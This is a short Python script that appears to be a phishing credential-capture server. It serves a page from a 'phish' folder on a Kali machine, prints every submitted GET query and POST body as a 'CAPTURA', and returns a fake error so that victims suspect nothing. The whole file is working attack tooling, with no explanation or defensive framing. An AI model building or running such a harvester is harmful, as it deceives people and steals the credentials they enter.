from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs, urlparse
import json
PAGE = open('/home/kali/phish/index.html','rb').read()
class H(BaseHTTPRequestHandler):
    def _page(self):
        self.send_response(200)
        self.send_header('Content-Type','text/html; charset=utf-8')
        self.send_header('Content-Length', str(len(PAGE)))
        self.end_headers(); self.wfile.write(PAGE)
    def do_GET(self):
        q = urlparse(self.path).query
        if q: print("\n*** CAPTURA GET ***", parse_qs(q), "\n")
        self._page()
    def do_POST(self):
        n = int(self.headers.get('Content-Length',0) or 0)
        body = self.rfile.read(n).decode('utf-8','replace')
        print("\n*** CAPTURA POST", self.path, "***")
        try: print("   ", json.loads(body))
        except: print("   ", parse_qs(body))
        print()
        self.send_response(200); self.send_header('Content-Type','application/json'); self.end_headers()
        self.wfile.write(b'{"ok":false,"error":"x"}')
    def log_message(self,*a): print(self.address_string(), self.command, self.path)
HTTPServer(('0.0.0.0',8000), H).serve_forever()
FIN
